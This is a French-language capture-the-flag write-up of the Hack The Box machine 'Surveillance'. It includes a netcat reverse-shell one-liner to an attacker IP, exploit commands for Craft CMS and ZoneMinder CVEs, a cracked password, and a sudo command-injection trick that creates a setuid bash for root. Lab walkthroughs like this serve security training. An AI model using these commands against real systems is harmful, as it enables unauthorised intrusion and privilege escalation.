---
date: 2024-04-19T15:48:38-05:00
# description: ""
image: "/images/HTB-Surveillance/Surveillance.png"
showTableOfContents: true
tags: ["HackTheBox"]
categories: ["Writeups"]
title: "HTB: Surveillance"
type: "post"
---

* Platforme: Hack The Box
* Lien: [Surveillance](https://app.hackthebox.com/machines/Surveillance)
* Niveau: Moyen
* OS: Linux
---

Surveillance débute par la découverte d'une application web fonctionnant sur le port 80, où nous identifions la version du logiciel utilisé et utilisons le `CVE-2023-41892` pour obtenir un accès initial. Grâce à une exploration plus poussée, nous trouvons une sauvegarde de base de données qui révèle le nom et le hash du mot de passe d'un utilisateur administrateur. Ces informations sont utilisées pour nous connecter au système par SSH, et nous découvrons un service en interne. En utilisant la redirection de port, nous accédons au service et nous tirons parti du `CVE-2023-26035` pour l'exploiter. Finalement, en exploitant les vulnérabilités de certains scripts, nous élevons nos privilèges et obtenons l'accès au compte root.

Adresse IP cible - `10.10.11.245`

## Scanning 

```
nmap -sC -sV -oA nmap/Surveillance 10.10.11.245
```

**Résultats**

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-14 12:04 CDT
Nmap scan report for 10.10.11.245
Host is up (0.044s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://surveillance.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.52 seconds
```

Le scan révèle deux ports ouverts, 22 (SSH) et 80 (HTTP - nginx), nous sommes également redirigés vers `http://surveillance.htb/`.

```
sudo echo "10.10.11.245 surveillance.htb" | sudo tee -a /etc/hosts
```

## Enumération

Le site web présente une compagnie offrant des services de sécurité, mais il n'offre aucune caractéristique exploitable.

![Surveillance website](/images/HTB-Surveillance/surveillance-website.png)

Avec `Wappalyzer` nous constatons que le site utilise `Craft CMS`. En parcourant le code source, nous trouvons que la version utilisée est `4.4.14`.

![Wappalyzer results](/images/HTB-Surveillance/Wappalyzer.png)

![Craft CMS version](/images/HTB-Surveillance/Craft-CMS-version.png)

La recherche de vulnérabilités conduit au [CVE-2023-41892](https://www.exploit-db.com/exploits/51918) qui permet l'exécution de code à distance sans authentification. Un PoC est disponible [ici](https://gist.github.com/gmh5225/8fad5f02c2cf0334249614eb80cbf4ce).

> D'après mon expérience, le PoC ci-dessus ne fonctionne pas toujours correctement, si cela vous arrive, utilisez [celui-ci](https://github.com/Faelian/CraftCMS_CVE-2023-41892).

## Accès Initial

Après avoir exécuté le script, nous obtenons un shell.

![Surveillance initial foothold](/images/HTB-Surveillance/foothold.png)

Il semble que nous ne soyons pas en mesure de l'améliorer, alors redirigeons-le vers un écouteur netcat.

```
nc -lvnp 4444
```

Exécutez la commande ci-dessous sur la cible (copiez-la entièrement et collez-la dans votre terminal)

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.4 4444 >/tmp/f 
/usr/bin/script -qc /bin/bash /dev/null
```

![Reverse shell transfer](/images/HTB-Surveillance/revshell.png)

Nous sommes maintenant en mesure d'améliorer le shell que nous obtenons par l'intermédiaire de notre listener.

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
Ctrl + Z
stty raw -echo; fg
stty rows 38 columns 116
```

![New shell](/images/HTB-Surveillance/new-shell.png)

Pour l'énumération du système, nous utilisons `linpeas` et notons que `mysql` est en cours d'exécution sur la cible.

![MySQL service](/images/HTB-Surveillance/mysql.png)

![MySQL version](/images/HTB-Surveillance/mysql1.png)

Nous trouvons également des identifiants pour MySQL.

![MySQL credentials](/images/HTB-Surveillance/Craft-db-pwd.png)

> Après s'être connecté à MySQL, nous trouvons une base de données `craftdb` et une table nommée `users`, mais nous ne pouvons pas déchiffrer les hashs qui s'y trouvent.

Une sauvegarde de la base de données se trouve sur la cible dans `/var/www/html/craft/storage/backups/`.

![FIles found by linpeas](/images/HTB-Surveillance/files.png)

L'archive est exfiltrée vers notre système, après l'avoir décompressée, nous trouvons un hash pour l'utilisateur `Matthew` qui est un administrateur.

> Si vous lancez `cat /etc/passwd` sur la cible, vous trouverez effectivement l'utilisateur `matthew`.

![matthew user](/images/HTB-Surveillance/matthew.png)

En utilisant [CrackStation](https://crackstation.net/) nous confirmons qu'il s'agit d'un hash sha256 et nous réussissons à le craquer pour récupérer le mot de passe `starcraft122490`.

![matthew user password](/images/HTB-Surveillance/matthew-pwd.png)

Avec les identifiants `matthew:starcraft122490` nous nous connectons via SSH et obtenons le drapeau `user.txt`.

![user flag](/images/HTB-Surveillance/user-flag.png)

### Redirection de port

En vérifiant les services fonctionnant sur la cible avec `ss -lntp`, nous trouvons un service sur le port `8080`.

![ss command](/images/HTB-Surveillance/ss-cmd.png)

La redirection de port est ensuite utilisée pour accéder au service via un tunnel SSH.

```
ssh -f -N -L 5555:127.0.0.1:8080 matthew@surveillance.htb
```

> La commande ci-dessus établit un tunnel entre notre machine et le serveur `surveillance.htb`.

Nous accédons ensuite au service en visitant `localhost:5555`, et trouvons une instance `ZoneMinder`. 

![ZoneMinder instance](/images/HTB-Surveillance/ZoneMinder.png)

En recherchant `zoneminder exploit` nous trouvons un [PoC](https://github.com/rvizx/CVE-2023-26035) pour le [CVE-2023-26035](https://www.exploit-db.com/exploits/51902) qui conduit également à un RCE non authentifié.

```
git clone https://github.com/rvizx/CVE-2023-26035
cd CVE-2023-26035
python3 exploit.py -t <target_url> -ip <attacker-ip> -p <port>
```
![ZoneMinder RCE exploit](/images/HTB-Surveillance/ZM-exploit.png)

Sur notre listener, nous obtenons un autre shell sous le nom de `zoneminder`.

![ZoneMinder RCE shell](/images/HTB-Surveillance/ZM-shell.png)

## Elévation de Privilèges

En lançant `sudo -l`, nous constatons que l'utilisateur `zoneminder` peut exécuter tout ce qui correspond au motif `/usr/bin/zm[a-zA-Z]*.pl` avec les privilèges `sudo` sans avoir à fournir de mot de passe. De plus, n'importe quelle option peut être ajoutée aux commandes du fait du caractère générique `*`.

![sudo -l command](/images/HTB-Surveillance/sudo-l.png)

Le script `zmupdate.pl` accepte des arguments tels que `--version` et `--user`, il peut donc potentiellement exécuter un fichier pour nous.

![zmupdate script](/images/HTB-Surveillance/zmupdate.png)

```
echo 'cp /bin/bash /tmp/bash;chmod 4755 /tmp/bash' > /tmp/exploit.sh
chmod +x /tmp/exploit.sh
```

> Lorsque le script `exploit.sh` sera exécuté, il créera une copie du binaire `bash` dans `/tmp` et définira ses permissions pour qu'il puisse être exécuté avec des privilèges élevés (setuid).

Avec la substitution de commande, nous exécutons notre script via le script `zmupdate.pl`.

```
sudo /usr/bin/zmupdate.pl --version=1 --user='$(/tmp/exploit.sh)'
```

> Lorsque la commande est exécutée, tout ce qui est inclus dans `$(...)` est traité comme une commande à exécuter par l'interpréteur de commandes, et le résultat de cette commande remplace la substitution de commande. Dans ce cas, `/tmp/exploit.sh` est un script qui crée un binaire setuid pour `/bin/bash` dans le répertoire `/tmp`.

Après avoir démarré une nouvelle instance de l'interpréteur de commandes bash, nous accédons à l'utilisateur root.

```
/tmp/bash -p
```
![root flag](/images/HTB-Surveillance/root-flag.png)

Ce défi était assez simple et montrait comment la redirection de port peut être utilisé à des fins d'exploitation. Si vous souhaitez approfondir la question du tunneling, Hack The Box propose un excellent module sur le sujet [ici](https://academy.hackthebox.com/module/details/158). Si vous souhaitez expérimenter différents outils de tunneling, vous pouvez consulter [awesome-tunneling](https://github.com/anderspitman/awesome-tunneling).

